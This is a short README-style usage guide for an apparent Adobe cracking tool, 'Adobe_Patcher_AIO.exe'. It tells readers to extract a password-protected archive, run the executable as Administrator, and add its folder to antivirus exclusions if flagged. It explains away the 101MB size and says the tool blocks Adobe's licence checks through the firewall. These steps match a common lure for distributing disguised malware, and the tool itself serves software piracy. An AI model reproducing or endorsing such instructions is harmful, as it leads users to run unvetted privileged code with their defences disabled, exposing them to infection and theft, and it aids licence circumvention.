## 🚀 How to use:
1. **Close** all Adobe applications and Creative Cloud desktop.
2. **Download** and extract the tool (Password: `2026`).
3. **Run** `Adobe_Patcher_AIO.exe` as Administrator.
4. **Select** the apps you want to fix and click "Patch".
5. **Enjoy** your full access.

### ⚠️ Troubleshooting:
- **Large file size (101MB):** This is due to the included offline Neural Filters database for Photoshop and local library patches.
- **Antivirus:** Like most patching tools, it may be flagged as a "HackTool". Add the folder to exclusions if the tool is blocked.
- **Firewall:** The tool automatically adds rules to block Adobe "Genuine Service" from calling home.
